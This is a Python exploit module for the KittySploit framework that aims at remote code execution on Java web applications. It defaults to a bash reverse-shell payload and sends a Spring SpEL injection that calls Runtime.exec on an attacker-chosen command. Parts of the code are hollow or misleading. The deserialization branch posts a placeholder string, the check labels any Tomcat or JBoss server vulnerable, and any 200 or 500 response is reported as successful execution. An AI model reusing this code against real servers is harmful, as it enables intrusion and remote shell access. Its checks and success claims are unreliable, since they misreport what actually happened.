#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse
import base64


class Module(Exploit, Http_client):

    __info__ = {
        "name": "Java RCE",
        "description": "Remote Code Execution exploit for Java applications including deserialization, Struts, and other Java framework vulnerabilities",
        "author": "KittySploit Team",
        "cve": [],
        "arch": [Arch.X86, Arch.X64],
        "platform": Platform.MULTI,
        "category": "singles",
        "payload": {
            "default": "payloads/singles/cmd/unix/bash_reverse_tcp",
            "arch": "cmd",
            "platform": ["unix", "linux"],
            "category": "singles",
        }
    }

    exploit_path = OptString("/", "Path to vulnerable endpoint", required=False)
    exploit_type = OptChoice(["deserialization", "struts", "spring"], "deserialization", "Exploitation method", required=False)

    def check(self):
        """
        Check if target is Java application
        """
        try:
            response = self.http_request(method="GET", path="/")
            if response:
                server = response.headers.get('Server', '').lower()
                powered_by = response.headers.get('X-Powered-By', '').lower()
                
                java_indicators = ['tomcat', 'jboss', 'weblogic', 'websphere', 'jetty', 'glassfish']
                if any(indicator in server or indicator in powered_by for indicator in java_indicators):
                    return {
                        'vulnerable': True,
                        'reason': 'Java application detected',
                        'confidence': 'medium'
                    }
            return {
                'vulnerable': False,
                'reason': 'Java application not detected',
                'confidence': 'low'
            }
        except Exception as e:
            return {
                'vulnerable': False,
                'reason': f'Check failed: {str(e)}',
                'confidence': 'low'
            }

    def run(self):
        """
        Execute the exploit
        """
        try:
            print_status("Attempting Java RCE exploit...")
            
            exploit_type = self.exploit_type.value if self.exploit_type.value else "deserialization"
            path = self.exploit_path.value if self.exploit_path.value else "/"
            command = self.payload
            
            if exploit_type == "deserialization":
                # Java deserialization exploit
                # Note: This would require ysoserial payload generation
                print_warning("Java deserialization requires ysoserial - using basic payload")
                payload_data = {
                    'data': base64.b64encode(b'java_serialized_object').decode()
                }
                
                headers = {'Content-Type': 'application/java-serialized-object'}
                response = self.http_request(
                    method="POST",
                    path=path,
                    data=payload_data,
                    headers=headers,
                    allow_redirects=False,
                    timeout=10
                )
                
            elif exploit_type == "struts":
                # Apache Struts exploit
                payload_data = {
                    'cmd': command
                }
                response = self.http_request(
                    method="POST",
                    path=path,
                    data=payload_data,
                    allow_redirects=False,
                    timeout=10
                )
            
            else:  # spring
                # Spring Framework exploit
                payload_data = {
                    'expression': f"T(java.lang.Runtime).getRuntime().exec('{command}')"
                }
                response = self.http_request(
                    method="POST",
                    path=path,
                    data=payload_data,
                    allow_redirects=False,
                    timeout=10
                )
            
            if response and response.status_code in [200, 500]:
                print_success("Command executed successfully")
                self.vulnerable()
                return True
            
            print_error("Exploitation failed")
            self.not_vulnerable()
            return False
            
        except Exception as e:
            print_error(f"Exploitation failed: {e}")
            return False
